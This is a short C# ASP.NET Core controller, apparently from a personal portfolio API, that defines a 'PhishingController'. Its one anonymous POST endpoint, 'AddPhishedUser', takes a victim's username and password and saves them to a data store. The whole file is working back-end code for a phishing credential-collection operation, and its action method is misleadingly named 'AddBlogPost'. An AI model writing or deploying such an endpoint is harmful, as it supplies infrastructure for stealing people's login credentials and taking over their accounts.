using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Portfolio_Api.Models;
using Portfolio_Api.Models.RequestModels;
using Portfolio_Api.Services;

namespace Portfolio_Api.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class PhishingController : ControllerBase
    {
        private IRepository _repository;
        public PhishingController(IRepository repository)
        {
            _repository = repository;
        }

        [HttpPost]
        [Route("AddPhishedUser"), AllowAnonymous]
        public async Task<IActionResult> AddBlogPost([FromBody] PhishedUserRequest request)
        {
            var validatedPhishedUser = new PhishedUser()
                .setUsername(request.username)
                .setPassword(request.password);

            await _repository.AddPhishedUser(validatedPhishedUser);
            return Ok();
        }
    }
}
